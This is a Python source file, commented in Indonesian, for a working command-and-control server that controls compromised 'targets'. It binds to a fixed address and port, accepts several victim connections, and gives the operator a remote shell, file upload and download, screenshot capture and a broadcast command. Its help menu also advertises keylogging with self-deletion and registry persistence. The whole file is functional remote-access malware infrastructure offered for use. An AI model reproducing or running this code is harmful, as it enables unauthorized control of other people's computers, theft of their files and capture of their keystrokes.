# Program ini adalah program Command and Control (C&C) yang memungkinkan pengguna untuk mengendalikan beberapa target yang terhubung melalui koneksi jaringan TCP/IP. 
import socket
import termcolor
import json
import os
import threading
# 1. **Import Library**:
#    - Program mengimpor beberapa modul Python standar seperti `socket`, `termcolor`, `json`, dan `os`, serta modul `threading`.

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        # 2. **Fungsi `reliable_recv`**: 
        #      - Fungsi ini menerima data dari target dengan mekanisme penerimaan yang andal untuk menghindari kegagalan.
        #      - Data yang diterima dikonversi dari format JSON ke format string.
def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())
    # 3. **Fungsi `reliable_send`**: 
    #      - Fungsi ini mengirimkan data ke target dalam format JSON untuk memastikan keandalan pengiriman.

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())
    # 4. **Fungsi `upload_file`**:
    #      - Fungsi ini membuka file yang akan diunggah, membacanya dalam mode biner,
    #      - dan mengirimkan isinya ke target.


def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
    # 5. **Fungsi `download_file`**: 
    #      - Fungsi ini menerima file dari target, membukanya dalam mode biner, dan menulis isinya ke file lokal.

def target_communication(target, ip):
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            break
        elif command == 'background':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --> Keluar Dari sensi dengan target 
            clear                               --> Bersihkan layar 
            cd *Directory Name*                 --> Mengubah direktori pada system target
            upload *file name*                  --> Unggah mesih ke mesin target
            download *file name*                --> Unduh file dari mesin target
            keylog_start                        --> Mulai Keyloger
            keylog_dump                         --> Cetak Ketikan Yang di masukan target
            keylog_stop                         --> Berhenti dan menghancurkan diri sendiri file keyloger
            persistence *RegName* *fileName*    --> Buat persistensi di registry'''),'green')
        else:
            result = reliable_recv(target)
            print(result)

            # 6. **Fungsi `target_communication`**:
            #     -  Fungsi ini menangani komunikasi dengan target tertentu. 
            #        Pengguna dapat memasukkan perintah yang akan dikirim ke target, 
            #        dan fungsi ini akan mengirimkan perintah tersebut ke target dan menampilkan hasilnya.

def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(termcolor.colored(str(ip) + ' Telah terhubung!', 'green'))
        except:
            pass
        # 7. **Fungsi `accept_connections`**:
        #      - Fungsi ini mengatur server untuk menerima koneksi dari target.
        #        Setiap koneksi yang diterima akan disimpan dalam daftar target dan IP terkait.


targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.9', 5555))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
print(termcolor.colored('[+] Menunggu Koneksi Masuk ...', 'green'))
# 8. **Inisialisasi dan Pengaturan Server**:
#     - Program mengikat socket pada alamat IP dan port tertentu, lalu mulai mendengarkan koneksi masuk menggunakan thread `accept_connections`.

while True:
    command = input('[**] Pusat Komando & Kontrol: ')
    if command == 'targets':
        counter = 0
        for ip in ips:
            print('Session ' + str(counter) + ' --- ' + str(ip))
            counter += 1
    elif command == 'clear':
        os.system('clear')
    elif command[:7] == 'session':
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            target_communication(tarnum, tarip)
        except:
            print('[-] TIdak ada sesi di bawah nomor Itu')
    elif command == 'exit':
        for target in targets:
            reliable_send(target, 'quit')
            target.close()
        sock.close()
        stop_flag = True
        t1.join()
        break
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, 'quit')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
    elif command[:7] == 'sendall':
        x = len(targets)
        print(x)
        i = 0
        try:
            while i < x:
                tarnumber = targets[i]
                print(tarnumber)
                reliable_send(tarnumber, command)
                i += 1
        except:
            print('Gagal')
    else:
        print(termcolor.colored('[!!] Perintah tidak ada ', 'red'))
        # 9. **Loop Utama**: 
        #      - Program memasuki loop utama dimana pengguna dapat memasukkan perintah dari Command & Control Center.
        #        Perintah tersebut akan dieksekusi sesuai dengan fungsionalitas yang diinginkan,
        #        seperti menampilkan target yang terhubung, mengirim perintah ke target tertentu, atau menghentikan koneksi dengan target.

# Program ini memberikan kontrol yang fleksibel dan cukup kuat untuk berkomunikasi dengan target secara terpusat dan melakukan berbagai tindakan sesuai kebutuhan.
# =================================================================================================================================================================================== 